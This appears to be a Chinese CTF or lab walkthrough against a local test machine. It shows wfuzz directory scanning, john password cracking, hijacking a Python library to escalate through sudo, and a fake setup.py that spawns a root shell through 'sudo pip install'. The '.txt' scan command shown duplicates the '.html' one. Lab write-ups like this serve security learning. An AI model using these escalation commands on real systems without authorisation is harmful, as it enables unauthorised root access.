**扫描网站目录，使用的是wfuzz工具，通过调整FUZZ的组合做的扫描：**

wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc xxx,xxx http://xxx.xxx.xxx.xxx/FUZZ

其中：

\-c    显示色彩

\-w    指定字典

\--hc   屏蔽xxx处指定返回代码 如404等

FUZZ   替换的字符位置

扫描目录：

wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,403 http://192.168.43.221/FUZZ

扫描出的目录有：

”/image” ”/manual” “/javascrip” 

![](../Images/3aaf33261ad0f3875035595ade6dfed1.png)

  

**扫描.html文件：**

wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,403 http://192.168.43.221/FUZZ.html

扫描出的html文件有：”index.html”

![](../Images/52dae2befe62988a2dbb488ec3bb1f14.png)

  

**扫描.txt文件**

wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,403 http://192.168.43.221/FUZZ.html

 扫描出的.txt文件有：”robots.txt”

john keyhash --wordlist=/usr/share/wordlists/fasttrack.txt

Sudo -l 可以查看当前用户可执行的高权限

发现可以用arsene用户执行python脚本，接下来去看看可以被执行的：

/home/arsene/heist.py文件 

![](../Images/b1e6193f8fe37dd2504266a98b2fdd5c.png)

尝试修改这个heist.py文件时，发现文件权限为readonly ，但是这个文件调用了webrowser这个库文件。我们用find命令查找这个模块，尝试对这个库文件做修改：

![](../Images/c7b1a8036a6ad33a6b5d6db82b18dc68.png)

  

在库文件中添加了光标所在的一行命令，使用以下命令实现提权：

Sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py

![](../Images/78016a74e7a990ed8158d9b391b81fac.png)

   

进入arsene用户后，查看sudo -l：查看可以越权执行的命令，发现可以用通过pip可以提权。

通过”echo "import os; os.execl('/bin/bash', 'bash', '-c', 'bash <$(tty) >$(tty) 2>$(tty)')" > setup.py”伪造setup.py后,执行：

”sudo pip install .”

实现提权。
